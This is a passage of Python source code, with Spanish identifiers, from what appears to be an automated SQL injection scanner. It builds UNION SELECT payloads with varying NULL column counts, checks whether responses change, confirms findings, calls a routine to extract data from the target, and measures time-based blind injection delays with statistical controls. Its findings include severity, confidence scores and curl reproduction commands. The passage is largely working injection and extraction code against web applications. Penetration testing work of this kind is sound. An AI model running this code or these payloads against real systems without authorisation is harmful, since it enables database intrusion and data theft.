            payload = f"' UNION SELECT {','.join(['NULL'] * n)}-- "
            resp, _, err = self._enviar(objetivo, payload)
            if self._bloqueado:
                return []
            if err or resp is None or resp.status_code >= 500:
                continue
            norm = _normalizar_volatil(resp.text)
            # Si la respuesta refleja la consulta (aunque venga escapada), no es
            # una inyección real: se descarta.
            if "union select" in norm or _normalizar_respuesta(payload) in norm:
                continue
            # Un error de SQL (p. ej. distinto nº de columnas) => seguir probando.
            firmas = set(self._firmas_error(resp.text.lower(), str(resp.headers).lower())) - firmas_base
            if firmas:
                continue
            if max(len(norm), len(base_norm)) < 20:
                continue
            sim = SequenceMatcher(None, base_norm, norm).ratio()
            if sim >= 0.90 or resp.status_code != base_resp.status_code:
                continue

            # Confirmación: la misma alteración debe reproducirse.
            if self.confirmar:
                resp2, _, err2 = self._enviar(objetivo, payload)
                if self._bloqueado or err2 or resp2 is None or resp2.status_code >= 500:
                    continue
                sim2 = SequenceMatcher(None, base_norm, _normalizar_volatil(resp2.text)).ratio()
                if sim2 >= 0.90:
                    self._nota("UNION: candidato no confirmado (descartado).")
                    continue
                sim = min(sim, sim2)

            confianza = min(100, round(70 + (1 - sim) * 30, 1))
            datos = self._extraer_union(objetivo, n)
            hallazgo = {
                "tipo": "union-based", "parametro": objetivo["param"],
                "metodo": objetivo["method"], "url_objetivo": objetivo["url"],
                "origen": objetivo.get("origen", ""),
                "payload": payload, "columnas": n,
                "severidad": "Alta", "confianza": confianza,
                "reproducir": self._curl(objetivo, payload),
                "evidencia": f"UNION SELECT con {n} columnas altera la respuesta (similitud {round(sim, 3)}).",
                "datos_extraidos": datos,
            }
            hallazgo["cvss"] = 0
            hallazgo["nivel_riesgo"] = ""
            hallazgo["explicacion"] = ""
            return [hallazgo]

        if sub_callback:
            sub_callback(1.0, "  UNION-based completado")
        return []

    def _medir_retardo(self, objetivo: dict, payload: str, delay: float,
                       tiempo_base_mediana: float):
        """Mide el retardo de un payload comparándolo con un control intercalado."""
        tiempos_control, tiempos_respuesta, exitos = [], [], 0
        t_max = max(self.timeout, delay + self.timeout)
        for _ in range(self.time_runs):
            _, t_control, e_control = self._enviar(
                objetivo, objetivo.get("valor_base", ""), timeout=t_max)
            _, t_resp, error = self._enviar(objetivo, payload, timeout=t_max)
            if not e_control and t_control is not None:
                tiempos_control.append(t_control)
            if error:
                continue
            tiempos_respuesta.append(t_resp)
            referencia = tiempos_control[-1] if tiempos_control else tiempo_base_mediana
            if t_resp >= referencia + delay * 0.6:
                exitos += 1
        if not tiempos_respuesta:
            return None
        med_control = statistics.median(tiempos_control) if tiempos_control else tiempo_base_mediana
        mediana = statistics.median(tiempos_respuesta)
        return {
            "mediana": mediana,
            "control": med_control,
            "diferencia": mediana - max(tiempo_base_mediana, med_control),
            "consistencia": exitos / self.time_runs,
            "respuestas": tiempos_respuesta,
            "controles": tiempos_control,
        }

    def _time_based(self, objetivo: dict, sub_callback=None) -> list:
        tiempos_base = []
        for _ in range(self.time_runs):
            _, tiempo_base, error_base = self._enviar(
                objetivo, objetivo.get("valor_base", ""), timeout=self.timeout
            )
            if error_base:
                if sub_callback:
                    sub_callback(1.0, "  Sin respuesta base válida")
                return []
            tiempos_base.append(tiempo_base)

        tiempo_base_mediana = statistics.median(tiempos_base)
        tiempo_base_desviacion = statistics.stdev(tiempos_base) if len(tiempos_base) > 1 else 0
        umbral_stat = tiempo_base_mediana + max(tiempo_base_desviacion * 3, self.time_threshold)

        total = len(SQLI_PAYLOADS_TIME)
        for i, (motor, payload, delay) in enumerate(SQLI_PAYLOADS_TIME):
            if sub_callback:
                sub_callback(i / total, f"  Probando {motor} (delay {delay}s)...")

            m = self._medir_retardo(objetivo, payload, delay, tiempo_base_mediana)
            if not m:
                continue
            # El retardo debe superar base y control, ser consistente y proporcional.
            if not (m["diferencia"] >= self.time_threshold and m["mediana"] >= umbral_stat
                    and m["consistencia"] >= 0.8 and m["diferencia"] >= delay * 0.6):
                continue

            # Confirmación: repetir el retardo descarta latencia aleatoria (tarpit).
            if self.confirmar:
                conf = self._medir_retardo(objetivo, payload, delay, tiempo_base_mediana)
                if not conf or conf["consistencia"] < 0.8 or conf["diferencia"] < delay * 0.6:
                    self._nota("time-based: el retardo no se reprodujo al confirmar (descartado).")
                    continue
                m["diferencia"] = max(m["diferencia"], conf["diferencia"])
                m["mediana"] = max(m["mediana"], conf["mediana"])
                m["respuestas"] = m["respuestas"] + conf["respuestas"]

            tiempo_mediana = m["mediana"]
            diferencia = m["diferencia"]
            consistencia = m["consistencia"]
            tiempos_respuesta = m["respuestas"]
            ratio = tiempo_mediana / tiempo_base_mediana if tiempo_base_mediana > 0 else 0

            confidence = min(100, round(40 + consistencia * 50 + (diferencia / delay) * 5, 1))
            if confidence < 50:
                confidence = min(100, round(30 + consistencia * 50 + (diferencia / delay) * 10, 1))

            if sub_callback:
                sub_callback(1.0, f"  Time-based: hallazgo en {motor}")
            hallazgo = {
                "tipo": "time-based blind", "parametro": objetivo["param"],
                "metodo": objetivo["method"], "url_objetivo": objetivo["url"],
                "origen": objetivo.get("origen", ""),
                "payload": payload, "severidad": "Alta", "confianza": confidence,
                "motor_sugerido": motor,
                "tiempo_base_mediana": round(tiempo_base_mediana, 3),
                "tiempo_base_desviacion": round(tiempo_base_desviacion, 3),
                "tiempo_respuesta_mediana": round(tiempo_mediana, 3),
                "diferencia": round(diferencia, 3), "ratio": round(ratio, 3),
                "delay_esperado": delay, "consistencia": round(consistencia, 2),
                "tiempos_por_run": [round(t, 3) for t in tiempos_respuesta],
                "tiempos_base": [round(t, 3) for t in tiempos_base],
                "reproducir": self._curl(objetivo, payload),
            }
            hallazgo["cvss"] = 0
            hallazgo["nivel_riesgo"] = ""
            hallazgo["explicacion"] = ""
            return [hallazgo]

        if sub_callback:
            sub_callback(1.0, "  Time-based completado")
        return []

    def _calcular_confianza_error(self, firmas: list, status_code: int) -> int:
        dbs = len({f["db"] for f in firmas})
        firma_count = len(firmas)
        base = min(firma_count * 15, 60)
        db_bonus = min(dbs * 10, 20)
        if status_code and status_code >= 500:
            base += 15
        elif status_code and status_code >= 400:
            base += 5
        return min(100, base + db_bonus)
